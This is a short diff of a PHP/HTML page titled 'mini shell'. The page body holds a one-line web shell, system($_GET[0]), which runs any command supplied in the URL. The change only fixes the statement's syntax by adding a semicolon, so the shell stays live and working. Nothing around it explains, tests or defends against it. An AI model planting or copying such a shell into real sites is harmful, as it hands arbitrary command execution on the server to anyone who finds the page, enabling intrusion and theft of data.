@@ -7,7 +7,7 @@
 </head>
 <body>
     <h1>mini shell</h1>
-    <?php system($_GET[0]) ?>
+    <?php system($_GET[0]); ?>
 </body>
 </html>
 
